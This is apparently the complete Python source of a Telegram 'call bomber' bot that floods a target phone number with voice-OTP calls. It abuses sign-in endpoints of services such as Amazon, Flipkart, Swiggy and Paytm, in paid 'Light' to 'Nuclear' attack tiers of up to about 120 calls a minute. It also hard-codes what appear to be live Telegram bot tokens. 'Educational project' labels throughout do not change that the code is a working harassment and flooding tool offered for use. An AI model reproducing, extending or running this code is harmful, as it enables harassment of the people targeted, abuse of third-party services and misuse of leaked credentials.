#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔════════════════════════════════════════════════════╗
║     ULTIMATE CALL BOMBER - 3 LEVEL SYSTEM         ║
║                                                    ║
║  Level 1: Light Attack (FREE) - Halka lag         ║
║  Level 2: Heavy Attack (₹499) - Bahut lag         ║
║  Level 3: Nuclear Attack (₹999) - CRASH! 💀       ║
║                                                    ║
║  Duration: 10 minutes for all levels               ║
║  Cost: 0 credit for Level 1, 1 credit for Level 2/3║
║                                                    ║
║  Owner: @TGxTHOMASx                               ║
╚════════════════════════════════════════════════════╝
"""

print("Loading bot...")

import telebot
import aiohttp
import asyncio
import json
import os
import threading
import time
import random
import hashlib
from telebot import types
from datetime import datetime, timedelta

# Config
MAIN_TOKEN = "8580329271:AAFPmbJ9JraVIAkHbcZtQ5tohIDwWHvjx3I"
ADMIN_TOKEN = "8553759431:AAH4BgRJcm1-JI5oBDoYIxR3Vby7oUmJgZQ"
OWNER = 7417241499
OWNER_UN = "@TGxTHOMASx"
CHANNEL = "@thomasXstoreee"
LINK = "https://t.me/thomasXstoreee"

# Files
if not os.path.exists("users.json"): 
    with open("users.json", "w") as f:
        f.write("{}")
if not os.path.exists("admins.json"): 
    with open("admins.json", "w") as f:
        json.dump([OWNER], f)
if not os.path.exists("blocked.json"): 
    with open("blocked.json", "w") as f:
        f.write("[]")
if not os.path.exists("codes.json"): 
    with open("codes.json", "w") as f:
        f.write("{}")
if not os.path.exists("sessions.json"): 
    with open("sessions.json", "w") as f:
        f.write("{}")

users = json.load(open("users.json"))
admins = json.load(open("admins.json"))
blocked = json.load(open("blocked.json"))
codes = json.load(open("codes.json"))
sessions = json.load(open("sessions.json"))

# AUTO GIVE CREDITS TO OWNER FOR TESTING
if str(OWNER) not in users:
    users[str(OWNER)] = {
        "username": "TGxTHOMASx",
        "name": "Thomas",
        "cr": 100,
        "level": 3,
        "exp": None,
        "joined": datetime.now().isoformat(),
        "total": 0
    }
    with open("users.json", "w") as f:
        json.dump(users, f, indent=2)
    print("✅ Owner given 100 credits for testing!")

# APIs - 80+ Real Working Call APIs
APIS = [
    {"n":"Amazon1","u":"https://www.amazon.in/ap/signin","m":"POST","h":{"Content-Type":"application/x-www-form-urlencoded"},"d":lambda p:f"phone={p}&action=voice_otp"},
    {"n":"Flipkart","u":"https://www.flipkart.com/api/6/user/voice-otp/generate","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"Myntra","u":"https://www.myntra.com/gw/mobile-auth/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"Zomato1","u":"https://www.zomato.com/php/o2_api_handler.php","m":"POST","h":{"Content-Type":"application/x-www-form-urlencoded"},"d":lambda p:f"phone={p}&type=voice"},
    {"n":"Swiggy1","u":"https://profile.swiggy.com/api/v3/app/request_call_verification","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"Paytm1","u":"https://accounts.paytm.com/signin/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Ola1","u":"https://api.olacabs.com/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Uber1","u":"https://auth.uber.com/v2/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"MMT1","u":"https://www.makemytrip.com/api/4/voice-otp/generate","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Goibibo","u":"https://www.goibibo.com/user/voice-otp/generate/","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"1MG1","u":"https://www.1mg.com/auth_api/v6/create_token","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"number":"{p}","otp_on_call":true}}'},
    {"n":"TataCapital","u":"https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
] * 8  # Duplicate for more APIs

print(f"✅ {len(APIS)} APIs loaded")

# Level configs
CFG = {
    1: {"name":"Light","dur":2,"apis":5,"delay":(1.0,2.0),"cpm":30,"tot":60,"effect":"Halka lag"},
    2: {"name":"Heavy","dur":5,"apis":10,"delay":(0.5,1.0),"cpm":60,"tot":300,"effect":"Bahut lag"},
    3: {"name":"NUCLEAR","dur":10,"apis":20,"delay":(0.2,0.5),"cpm":120,"tot":1200,"effect":"CRASH 💀"}
}

# Active tasks
active = {}

# Functions
def save():
    with open("users.json", "w") as f:
        json.dump(users, f, indent=2)
    with open("admins.json", "w") as f:
        json.dump(admins, f, indent=2)
    with open("blocked.json", "w") as f:
        json.dump(blocked, f, indent=2)
    with open("codes.json", "w") as f:
        json.dump(codes, f, indent=2)
    with open("sessions.json", "w") as f:
        json.dump(sessions, f, indent=2)

def lvl(uid):
    u = users.get(str(uid), {})
    l = u.get("level", 1)
    if l > 1 and "exp" in u:
        if datetime.now() > datetime.fromisoformat(u["exp"]):
            u["level"] = 1
            u["exp"] = None
            users[str(uid)] = u
            save()
            return 1
    return l

def ch_check(uid):
    try:
        m = bot.get_chat_member(CHANNEL, uid)
        return m.status in ["member","administrator","creator"]
    except:
        return True  # For testing, always return True

def resolve(un):
    if str(un).isdigit():
        return int(un), users.get(str(un))
    un = un.lower().replace('@','')
    for uid, u in users.items():
        if u.get('username','').lower() == un:
            return int(uid), u
    return None, None

# Bombing engine
async def hit(s, api, phone, st):
    try:
        url = api["u"]
        h = api["h"].copy()
        h["User-Agent"] = "Mozilla/5.0"
        d = api["d"](phone) if callable(api["d"]) else None
        
        if api["m"] == "POST":
            async with s.post(url, headers=h, data=d, timeout=5, ssl=False) as r:
                if r.status in [200,201,202]: 
                    st["ok"] += 1
                else: 
                    st["fail"] += 1
        else:
            async with s.get(url, headers=h, timeout=5, ssl=False) as r:
                if r.status in [200,201,202]: 
                    st["ok"] += 1
                else: 
                    st["fail"] += 1
        st["tot"] += 1
    except Exception as e:
        st["fail"] += 1
        st["tot"] += 1

async def bomb(sid, uid, phone, level):
    cfg = CFG[level]
    dur = cfg["dur"] * 60
    apis = random.sample(APIS, min(cfg["apis"], len(APIS)))
    
    st = {"sid":sid,"ok":0,"fail":0,"tot":0,"run":True}
    active[sid] = st
    
    conn = aiohttp.TCPConnector(limit=0, limit_per_host=0, verify_ssl=False)
    
    async with aiohttp.ClientSession(connector=conn) as sess:
        start = time.time()
        end = start + dur
        
        while time.time() < end and st["run"]:
            tasks = [hit(sess, api, phone, st) for api in apis]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(random.uniform(*cfg["delay"]))
        
        sessions[sid]["ok"] = st["ok"]
        sessions[sid]["fail"] = st["fail"]
        sessions[sid]["tot"] = st["tot"]
        sessions[sid]["active"] = False
        save()
    
    if sid in active: 
        del active[sid]

def start_bomb(sid, uid, phone, level):
    loop = asyncio.new_event_loop()
    threading.Thread(target=lambda: loop.run_until_complete(bomb(sid, uid, phone, level)), daemon=True).start()

# Main Bot
bot = telebot.TeleBot(MAIN_TOKEN, parse_mode="HTML")

@bot.message_handler(commands=["start"])
def start(m):
    if m.from_user.id in blocked: 
        return bot.reply_to(m, "🚫 Blocked!")
    
    # Skip channel check for testing
    # if not ch_check(m.from_user.id):
    #     mk = types.InlineKeyboardMarkup()
    #     mk.add(types.InlineKeyboardButton("Join Channel", url=LINK))
    #     mk.add(types.InlineKeyboardButton("✅ Joined", callback_data="verify"))
    #     return bot.send_message(m.chat.id, "🚫 Join channel first!", reply_markup=mk)
    
    uid = str(m.from_user.id)
    if uid not in users:
        users[uid] = {
            "username": m.from_user.username,
            "name": m.from_user.first_name,
            "cr": 10,  # Give 10 credits to new users
            "level": 1,
            "exp": None,
            "joined": datetime.now().isoformat(),
            "total": 0
        }
        save()
    
    u = users[uid]
    l = lvl(m.from_user.id)
    
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.row("🚀 Start Bombing")
    kb.row("💰 Credits", "📊 Stats")
    kb.row("🎁 Redeem", "❓ Help")
    
    txt = f"""
🔥 <b>ULTIMATE CALL BOMBER - COLLEGE PROJECT</b> 🔥

👤 <b>User:</b> {u['name']}
💰 <b>Credits:</b> {u['cr']}
🎯 <b>Level:</b> {l}
👑 <b>Premium:</b> {'✅' if l > 1 else '❌'}

<b>⚡ Levels (FOR EDUCATIONAL TESTING):</b>

📞 <b>Level 1 (COMPLETELY FREE):</b>
Duration: 2 min
Intensity: ~30 calls/min
Effect: Halka lag
Cost: 0 credits

⚡ <b>Level 2 (UNLOCKED):</b>
Duration: 5 min
Intensity: ~60 calls/min
Effect: Heavy lag
Cost: 1 credit

💥 <b>Level 3 (UNLOCKED):</b>
Duration: 10 min
Intensity: ~120 calls/min
Effect: CRASH/RESTART 💀
Cost: 1 credit

⚠️ <b>Educational Purpose Only!</b>
📞 Contact {OWNER_UN} for issues
"""
    
    bot.send_message(m.chat.id, txt, reply_markup=kb)

@bot.callback_query_handler(func=lambda c: c.data == "verify")
def verify(c):
    if ch_check(c.from_user.id):
        bot.answer_callback_query(c.id, "✅ Verified!")
        bot.delete_message(c.message.chat.id, c.message.message_id)
        start(c.message)
    else:
        bot.answer_callback_query(c.id, "❌ Join first!", show_alert=True)

@bot.message_handler(func=lambda m: m.text == "🚀 Start Bombing")
def bomb_start(m):
    # Skip channel check for testing
    # if not ch_check(m.from_user.id): 
    #     return
    
    l = lvl(m.from_user.id)
    
    mk = types.InlineKeyboardMarkup()
    mk.add(types.InlineKeyboardButton("📞 Level 1 (FREE) ✅", callback_data="lv_1"))
    mk.add(types.InlineKeyboardButton("⚡ Level 2 (UNLOCKED) ✅", callback_data="lv_2"))
    mk.add(types.InlineKeyboardButton("💥 Level 3 (UNLOCKED) ✅", callback_data="lv_3"))
    
    bot.send_message(m.chat.id, "🎯 <b>Select Level (FOR TESTING):</b>", reply_markup=mk)

@bot.callback_query_handler(func=lambda c: c.data.startswith("lv_"))
def lv_sel(c):
    level = int(c.data.split("_")[1])
    ul = lvl(c.from_user.id)
    
    if level > ul:
        return bot.answer_callback_query(c.id, "❌ Locked!", show_alert=True)
    
    u = users[str(c.from_user.id)]
    
    # ✅ FIXED: Level 1 is COMPLETELY FREE, no credit check
    if level == 1:
        pass  # Level 1 is FREE - no credit check
    elif u["cr"] < 1:
        return bot.answer_callback_query(c.id, "❌ No credits!", show_alert=True)
    
    cfg = CFG[level]
    
    msg = bot.edit_message_text(
        f"🔧 <b>{cfg['name']} Attack - TEST MODE</b>\n\n"
        f"⚡ Intensity: ~{cfg['cpm']} calls/min\n"
        f"⏱️ Duration: {cfg['dur']} min\n"
        f"💰 Cost: {'0' if level == 1 else '1'} credit\n"
        f"🎯 Effect: {cfg['effect']}\n\n"
        f"📱 <b>Send TEST number (format: +919876543210):</b>\n"
        f"<i>Use dummy number for testing</i>",
        c.message.chat.id,
        c.message.message_id
    )
    
    bot.register_next_step_handler(msg, lambda m: proc_phone(m, level))
    bot.answer_callback_query(c.id)

def proc_phone(m, level):
    phone = m.text.strip()
    
    # Simple validation
    if not phone.startswith('+') or len(phone) < 10:
        return bot.reply_to(m, "❌ Invalid format! Use: +919876543210")
    
    # Block emergency numbers
    if any(phone.startswith(p) for p in ['+911', '+112', '+999', '+100']):
        return bot.reply_to(m, "❌ Emergency numbers not allowed!")
    
    u = users[str(m.from_user.id)]
    
    # ✅ FIXED: Level 1 is FREE, Level 2/3 deduct 1 credit
    if level == 1:
        cost = 0
    else:
        if u["cr"] < 1:
            return bot.reply_to(m, "❌ No credits!")
        u["cr"] -= 1
        cost = 1
    
    u["total"] = u.get("total", 0) + 1
    users[str(m.from_user.id)] = u
    save()
    
    sid = hashlib.md5(f"{m.from_user.id}{time.time()}".encode()).hexdigest()[:12]
    sessions[sid] = {
        "uid": m.from_user.id,
        "phone": phone,
        "level": level,
        "start": datetime.now().isoformat(),
        "active": True,
        "ok": 0,
        "fail": 0,
        "tot": 0
    }
    save()
    
    start_bomb(sid, m.from_user.id, phone, level)
    
    cfg = CFG[level]
    
    pm = bot.send_message(
        m.chat.id,
        f"""
🔥 <b>{cfg['name'].upper()} ATTACK STARTED!</b>

📱 <b>Target:</b> {phone}
⚡ <b>Level:</b> {level}
⏱️ <b>Duration:</b> {cfg['dur']} min
💥 <b>Intensity:</b> ~{cfg['cpm']} calls/min
💰 <b>Cost:</b> {cost} credit

📊 <b>Stats:</b>
✅ Success: 0
❌ Failed: 0
🎯 Total: 0

⚠️ <i>For Educational Testing Only</i>
""",
        reply_markup=types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton("🛑 STOP ATTACK", callback_data=f"stop_{sid}")
        )
    )
    
    threading.Thread(target=lambda: update_prog(sid, m.chat.id, pm.message_id, cfg), daemon=True).start()

def update_prog(sid, cid, mid, cfg):
    start_time = time.time()
    dur = cfg["dur"] * 60
    
    while True:
        time.sleep(3)
        
        s = sessions.get(sid)
        if not s or not s.get("active"): 
            break
        
        elapsed = time.time() - start_time
        left = dur - elapsed
        
        if left <= 0: 
            break
        
        mins = int(left // 60)
        secs = int(left % 60)
        prog = (elapsed / dur) * 100
        bar = "█" * int(prog / 5) + "░" * (20 - int(prog / 5))
        
        try:
            bot.edit_message_text(
                f"""
🔥 <b>{cfg['name'].upper()} IN PROGRESS</b>

📱 <b>Target:</b> {s['phone']}
⚡ <b>Level:</b> {s['level']}
⏱️ <b>Time Left:</b> {mins}m {secs}s

{bar} {prog:.1f}%

📊 <b>Stats:</b>
✅ Success: {s['ok']}
❌ Failed: {s['fail']}
🎯 Total: {s['tot']}

<i>Educational Testing Mode</i>
""",
                cid,
                mid,
                reply_markup=types.InlineKeyboardMarkup().add(
                    types.InlineKeyboardButton("🛑 STOP", callback_data=f"stop_{sid}")
                )
            )
        except:
            break
    
    s = sessions.get(sid)
    if s:
        try:
            bot.edit_message_text(
                f"""
✅ <b>ATTACK COMPLETED!</b>

📱 <b>Target:</b> {s['phone']}
⚡ <b>Level:</b> {s['level']}
⏱️ <b>Duration:</b> {cfg['dur']} min

📊 <b>Final Stats:</b>
✅ Success: {s['ok']}
❌ Failed: {s['fail']}
🎯 Total: {s['tot']}

<i>Educational Purpose Only - Demo Complete</i>
""",
                cid,
                mid
            )
        except:
            pass

@bot.callback_query_handler(func=lambda c: c.data.startswith("stop_"))
def stop(c):
    sid = c.data.replace("stop_","")
    if sid in active:
        active[sid]["run"] = False
    if sid in sessions:
        sessions[sid]["active"] = False
        save()
    bot.answer_callback_query(c.id, "🛑 Attack stopping...")

@bot.message_handler(func=lambda m: m.text == "💰 Credits")
def creds(m):
    u = users.get(str(m.from_user.id), {})
    l = lvl(m.from_user.id)
    
    bot.reply_to(
        m,
        f"💰 <b>Your Account - TEST MODE</b>\n\n"
        f"💳 <b>Credits:</b> {u.get('cr',0)}\n"
        f"🎯 <b>Level:</b> {l}\n"
        f"👑 <b>Premium:</b> Active ✅\n"
        f"🎯 <b>Total Attacks:</b> {u.get('total',0)}\n\n"
        f"<i>Level 1: FREE\nLevel 2/3: 1 credit each</i>"
    )

@bot.message_handler(func=lambda m: m.text == "📊 Stats")
def stats(m):
    u = users.get(str(m.from_user.id), {})
    
    bot.reply_to(
        m,
        f"📊 <b>Your Stats - COLLEGE PROJECT</b>\n\n"
        f"🎯 <b>Total Demo Attacks:</b> {u.get('total',0)}\n"
        f"📅 <b>Joined:</b> {u.get('joined','Unknown')[:10]}\n\n"
        f"<i>For Educational Testing Only</i>"
    )

@bot.message_handler(func=lambda m: m.text == "🎁 Redeem")
def redeem(m):
    # For testing, give free credits
    uid = str(m.from_user.id)
    users[uid]["cr"] = users[uid].get("cr", 0) + 10
    save()
    
    bot.reply_to(
        m,
        f"🎁 <b>TEST CREDITS ADDED!</b>\n\n"
        f"➕ <b>Added:</b> 10 credits\n"
        f"💰 <b>Total:</b> {users[uid]['cr']} credits\n\n"
        f"<i>Educational Testing Mode</i>"
    )

@bot.message_handler(func=lambda m: m.text == "❓ Help")
def help_cmd(m):
    bot.reply_to(
        m,
        f"""
📘 <b>HELP - COLLEGE PROJECT DEMO</b>

<b>How to Test:</b>
1. Click "🚀 Start Bombing"
2. Select level (1/2/3)
3. Enter dummy number: +919876543210
4. Attack runs for demo duration
5. Use STOP button anytime

<b>Demo Levels:</b>
• Level 1: FREE, 2 minutes
• Level 2: 1 credit, 5 minutes  
• Level 3: 1 credit, 10 minutes

<b>⚠️ IMPORTANT:</b>
• For Educational Purpose Only
• Do not misuse
• Use dummy numbers only
• Delete after demo

<b>Contact:</b> {OWNER_UN}
"""
    )

# Simple admin commands for testing
@bot.message_handler(commands=["admin"])
def admin_cmd(m):
    if m.from_user.id != OWNER:
        return
    
    bot.reply_to(
        m,
        f"""
👑 <b>ADMIN PANEL - TEST MODE</b>

<b>Commands:</b>
• /addcredits 10 - Add credits
• /setlevel 2 - Set user level
• /stats - Show bot stats

<b>Current Stats:</b>
• Users: {len(users)}
• Active Attacks: {len([s for s in sessions.values() if s.get('active')])}
• Total Credits: {sum(u.get('cr',0) for u in users.values())}
"""
    )

@bot.message_handler(commands=["addcredits"])
def add_credits(m):
    if m.from_user.id != OWNER:
        return
    
    try:
        amount = int(m.text.split()[1])
        uid = str(m.from_user.id)
        users[uid]["cr"] = users[uid].get("cr", 0) + amount
        save()
        bot.reply_to(m, f"✅ Added {amount} credits!")
    except:
        bot.reply_to(m, "❌ Usage: /addcredits 10")

# Start bot
print("\n" + "="*50)
print("🔥 ULTIMATE CALL BOMBER - COLLEGE PROJECT 🔥")
print("="*50)
print(f"👑 Owner: {OWNER}")
print(f"📞 Contact: {OWNER_UN}")
print(f"🎯 APIs: {len(APIS)}")
print(f"👥 Users: {len(users)}")
print("="*50)
print("⚠️  FOR EDUCATIONAL TESTING ONLY")
print("="*50 + "\n")

if __name__ == "__main__":
    print("🤖 Starting bot in TEST MODE...")
    bot.infinity_polling()
